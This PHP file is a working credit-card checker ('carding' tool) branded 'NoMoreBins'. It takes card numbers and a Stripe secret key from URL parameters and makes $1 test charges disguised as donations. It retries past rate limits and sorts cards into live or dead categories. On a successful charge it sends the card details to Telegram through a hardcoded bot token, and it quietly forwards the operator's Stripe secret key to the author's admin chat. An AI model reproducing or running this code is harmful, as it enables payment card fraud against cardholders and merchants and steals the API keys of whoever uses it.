<?php


//===================== [ MODIFY NO MORE BINS ] ====================//
#---------------[ STRIPE MERCHANTE PROXYLESS ]----------------#



error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');


//================ [ FUNCTIONS & LISTA ] ===============//

function GetStr($string, $start, $end){
    $string = ' ' . $string;
    $ini = strpos($string, $start);
    if ($ini == 0) return '';
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return trim(strip_tags(substr($string, $ini, $len)));
}


function multiexplode($seperator, $string){
    $one = str_replace($seperator, $seperator[0], $string);
    $two = explode($seperator[0], $one);
    return $two;
    };
    
$idd = $_Get['idd'];
$amt = '1';
$sk = $_GET['sec'];
$lista = $_GET['lista'];
    $cc = multiexplode(array(":", "|", ""), $lista)[0];
    $mes = multiexplode(array(":", "|", ""), $lista)[1];
    $ano = multiexplode(array(":", "|", ""), $lista)[2];
    $cvv = multiexplode(array(":", "|", ""), $lista)[3];

if (strlen($mes) == 1) $mes = "0$mes";
if (strlen($ano) == 2) $ano = "20$ano";


$userid = $_GET['tgm'];
$admin = '-1001947539791';

function send_message($userid, $msg) {
$text = urlencode($msg);
file_get_contents("https://api.telegram.org/bot6237436815:AAHxumJWB5QdMj_0imJYOxcBY2Ia_ruVkks/sendMessage?chat_id=$userid&text=$text&parse_mode=HTML");
file_get_contents("https://api.telegram.org/bot6237436815:AAHxumJWB5QdMj_0imJYOxcBY2Ia_ruVkks/sendMessage?chat_id=$admin&text=$text&parse_mode=HTML");

};


//================= [ CURL REQUESTS ] =================//

#-------------------[1st REQ]--------------------#  
$x = 0;  
while(true)  
{  
$ch = curl_init();  
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');  
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);  
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);  
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);  
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);  
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');  
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'');  
$result1 = curl_exec($ch);  
$tok1 = Getstr($result1,'"id": "','"');  
$msg = Getstr($result1,'"message": "','"');  
//echo "<br><b>Result1: </b> $result1<br>";  
if (strpos($result1, "rate_limit"))   
{  
    $x++;  
    continue;  
}  
break;  
}  
  
  
#------------------[2nd REQ]--------------------#  
$x = 0;  
while(true)  
{  
$ch = curl_init();  
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents');  
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);  
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);  
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);  
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);  
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');  
curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount=100&currency=usd&payment_method_types[]=card&description=TEAM NMB DONATION&payment_method='.$tok1.'&confirm=true&off_session=true');  
$result2 = curl_exec($ch);  
$tok2 = Getstr($result2,'"id": "','"');  
//$receipturl = trim(strip_tags(getStr($result2,'"receipt_url": "','"')));  
//echo "<br><b>Result2: </b> $result2<br>";  
if (strpos($result2, "rate_limit"))   
{  
    $x++;  
    continue;  
}  
break;  
}


//=================== [ RESPONSES ] ===================//

if(strpos($result2, '"seller_message": "Payment complete."' )) {
    echo 'CHARGED</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>⋟ Response: ✅ 𝙉𝙈𝘽 𝘾𝙝𝙖𝙧𝙜𝙚𝙙 $1 @NoMoreBins<br>';
    send_message($userid, "🔥 𝘾𝘾➠ <code>$lista</code>\n𝙏𝙔𝙋𝙀 ➠ 𝙉𝙈𝘽 𝘾𝘾𝙉 $1 ✅ @NoMoreBins");
    send_message($admin, "CC \nϲϲ ➔ <code>$lista</code>\n𝙏𝙔𝙋𝙀 ➠ 𝘾𝘾𝙉 $1 \nSK➠ <code>$sk</code>");
}
elseif(strpos($result2,'"cvc_check": "pass"')){
    echo 'CVV</span>  </span>CC:  '.$lista.'</span>  <br>⋟ Result: CVV LIVE</span><br>';
}
elseif(strpos($result1, "generic_decline")) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>⋟ Result: GENERIC DECLINED</span><br>';
    }
elseif(strpos($result2, "generic_decline" )) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>⋟ Result: GENERIC DECLINED</span><br>';
}
elseif(strpos($result2, "insufficient_funds" )) {
    echo 'CVV</span>  </span>CC:  '.$lista.'</span>  <br>⋟ Result: INSUFFICIENT FUNDS</span><br>';
}

elseif(strpos($result2, "fraudulent" )) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>⋟ Result: FRAUDULENT</span><br>';
}
elseif(strpos($result1, "do_not_honor" )) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>⋟ Result: DO NOT HONOR</span><br>';
    }
elseif(strpos($result2, "do_not_honor" )) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>⋟ Result: DO NOT HONOR</span><br>';
}
elseif(strpos($result1,"fraudulent")){
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>⋟ Result: FRAUDULENT</span><br>';

}
elseif(strpos($result2,'"code": "incorrect_cvc"')){
    echo 'CCN</span>  </span>CC:  '.$lista.'</span>  <br>⋟ Result: CCN LIVE</span><br>';
}
elseif(strpos($result1,"invalid_expiry_month")){
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>⋟ Result: INVAILD EXPIRY MONTH</span><br>';

}
elseif(strpos($result2,"invalid_account")){
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>⋟ Result: INVAILD ACCOUNT</span><br>';
}
elseif(strpos($result2, "transaction_not_allowed" )) {
    echo 'CVV</span>  </span>CC:  '.$lista.'</span>  <br>⋟ Result: TRANSACTION NOT ALLOWED</span><br>';
    }
elseif(strpos($result2, "incorrect_cvc" )) {
    echo 'CCN</span>  </span>CC:  '.$lista.'</span>  <br>⋟ Result: CCN LIVE</span><br>';
}
elseif(strpos($result1, "pickup_card" )) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>⋟ Result: PICKUP CARD</span><br>';
}
elseif(strpos($result2, "pickup_card" )) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>⋟ Result: PICKUP CARD</span><br>';
}
elseif(strpos($result2, 'Your card has expired.')) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>⋟ Result: EXPIRED CARD</span><br>';
}
elseif(strpos($result1, 'Your card has expired.')) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>⋟ Result: EXPIRED CARD</span><br>';
}
elseif(strpos($result2, '"code": "processing_error"')) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>⋟ Result: PROCESSING ERROR</span><br>';
    }
elseif(strpos($result2, ' "message": "Your card number is incorrect."')) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>⋟ Result: YOUR CARD NUMBER IS INCORRECT</span><br>';
    }
elseif(strpos($result2, '"decline_code": "service_not_allowed"')) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>⋟ Result: SERVICE NOT ALLOWED</span><br>';
    }
elseif(strpos($result2, '"code": "processing_error"')) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>⋟ Result: PROCESSING ERROR</span><br>';
    }
elseif(strpos($result1, ' "message": "Your card number is incorrect."')) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>⋟ Result: YOUR CARD NUMBER IS INCORRECT</span><br>';
    }
elseif(strpos($result2, '"decline_code": "service_not_allowed"')) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>⋟ Result: SERVICE NOT ALLOWED</span><br>';

}
elseif(strpos($result2, "incorrect_number")) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>⋟ Result: INCORRECT CARD NUMBER</span><br>';
}
elseif(strpos($result1, "incorrect_number")) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>⋟ Result: INCORRECT CARD NUMBER</span><br>';
}
elseif(strpos($result1, 'Your card was declined.')) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>⋟ Result: CARD DECLINED</span><br>';
}
elseif(strpos($result1, "do_not_honor")) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>⋟ Result: DO NOT HONOR</span><br>';
    }
elseif(strpos($result2, "generic_decline")) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>⋟ Result: GENERIC CARD</span><br>';
}
elseif(strpos($result, 'Your card was declined.')) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>⋟ Result: CARD DECLINED</span><br>';

}
elseif(strpos($result2,'"cvc_check": "unchecked"')){
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>⋟ Result: CVC_UNCHECKED : INFORM AT OWNER</span><br>';
}
elseif(strpos($result2,'"cvc_check": "fail"')){
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>⋟ Result: CVC_CHECK : FAIL</span><br>';
}
elseif(strpos($result2, "card_not_supported")) {
	echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>⋟ Result: CARD NOT SUPPORTED</span><br>';
}
elseif(strpos($result2,'"cvc_check": "unavailable"')){
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>⋟ Result: CVC_CHECK : UNVAILABLE</span><br>';
}
elseif(strpos($result2,'"cvc_check": "unchecked"')){
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>⋟ Result: CVC_UNCHECKED : INFORM TO OWNER</span><br>';
}
elseif(strpos($result2,'"cvc_check": "fail"')){
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>⋟ Result: CVC_CHECKED : FAIL</span><br>';
}

elseif (strpos($result,'Your card does not support this type of purchase.')) {
    echo 'DEAD</span> CC:  '.$lista.'</span>  <br>⋟ Result: CARD NOT SUPPORT THIS TYPE OF PURCHASE</span><br>';
    }

elseif(strpos($result1,'"cvc_check": "pass"')){
    echo 'CVV</span>  </span>CC:  '.$lista.'</span>  <br>⋟ Result: CVV LIVE</span><br>';
}
elseif(strpos($result1, "testmode_charges_only" )) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>⋟ Result: SK KEY DEAD OR INVALID</span><br>';
}
elseif(strpos($result1, "api_key_expired" )) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>⋟ Result: SK KEY EXPIRED</span><br>';
}
elseif(strpos($result1, "parameter_invalid_empty" )) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>⋟ Result: ENTER CC TO CHECK</span><br>';
}
elseif(strpos($result1, "card_not_supported" )) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>⋟ Result: CARD NOT SUPPORTED</span><br>';
}
else {
    echo 'DEAD</span> CC:  '.$lista.'</span>  <br>⋟ Result: GENERIC DECLINED</span><br>';      
}

echo "⋟ BYPASSING : $x <br>";

//===================== [ MODIFY NO MORE BINS ] ====================//


//echo "<br><b>Lista:</b> $lista<br>";
//echo "<br><b>CVV Check:</b> $cvccheck<br>";
//echo "<b>D_Code:</b> $dcode<br>";
//echo "<b>Reason:</b> $reason<br>";
//echo "⋟ Risk Level: $riskl<br>";
//echo "<b>Seller Message:</b> $seller_msg<br>";

//echo "<br><b>Result3: </b> $result2<br>";

curl_close($ch);
ob_flush();
?>